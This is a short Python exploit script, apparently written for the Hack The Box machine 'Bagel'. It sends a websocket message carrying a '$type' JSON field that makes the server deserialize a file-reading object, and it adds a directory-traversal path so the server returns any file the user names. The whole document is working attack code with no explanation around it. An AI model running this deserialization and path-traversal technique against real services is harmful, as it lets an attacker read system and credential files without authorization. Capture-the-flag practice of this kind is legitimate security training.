#!/usr/bin/python3
import sys, websocket, json

if len(sys.argv) < 2:
    print(f"\n\033[0;37m[\033[0;31m-\033[0;37m] Uso: python3 {sys.argv[0]} <file>\n")
    sys.exit(1)

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/")

order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": f"../../../../../..{sys.argv[1]}"}}
data = str(json.dumps(order))

ws.send(data)
output = ws.recv()

json = json.loads(output)
print(json["RemoveOrder"]["ReadFile"])
